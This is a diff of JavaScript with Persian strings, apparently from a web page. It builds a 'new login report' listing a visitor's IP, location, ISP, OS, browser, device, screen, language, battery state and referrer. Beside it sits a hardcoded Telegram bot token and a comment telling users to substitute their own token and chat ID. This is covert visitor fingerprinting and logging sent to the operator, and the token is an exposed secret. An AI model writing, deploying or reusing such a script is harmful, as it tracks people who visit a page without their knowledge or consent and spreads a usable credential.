@@ -110,43 +110,30 @@
           referrer: document.referrer || "مستقیم"
         };
 
-        const message = `
-[گزارش ورود جدید]
-
-
-
-IP: ${info.ip}
-
-
-مکان: ${info.location}
-
-
-ارائه‌دهنده: ${info.org}
-
-
-سیستم‌عامل: ${info.os}
-
-
-مرورگر: ${info.browser}
-
-
-نوع دستگاه: ${info.device}
-
-
-رزولوشن صفحه: ${info.screen}
-
-
-زبان مرورگر: ${info.language}
-
-
-وضعیت باتری: ${info.battery} - شارژ: ${info.charging}
-
-
-زمان محلی: ${info.local_time}
-
-
-زمان منطقه‌ای: ${info.ip_time}
-        `;
+        const message = `[گزارش ورود جدید]\n
+IP: ${info.ip}\n
+\n
+مکان: ${info.location}\n
+\n
+ارائه‌دهنده: ${info.org}\n
+\n
+سیستم‌عامل: ${info.os}\n
+\n
+مرورگر: ${info.browser}\n
+\n
+نوع دستگاه: ${info.device}\n
+\n
+رزولوشن صفحه: ${info.screen}\n
+\n
+زبان مرورگر: ${info.language}\n
+\n
+وضعیت باتری: ${info.battery} - شارژ: ${info.charging}\n
+\n
+ارجاع‌دهنده: ${info.referrer}\n
+\n
+زمان محلی: ${info.local_time}\n
+\n
+زمان منطقه‌ای: ${info.ip_time}`;
 
         // جایگزین کن با توکن و چت آیدی خودت
         const token = "8194809349:AAEqk8M8sOWGxQwDO0tNlybKDki26JENT4w";
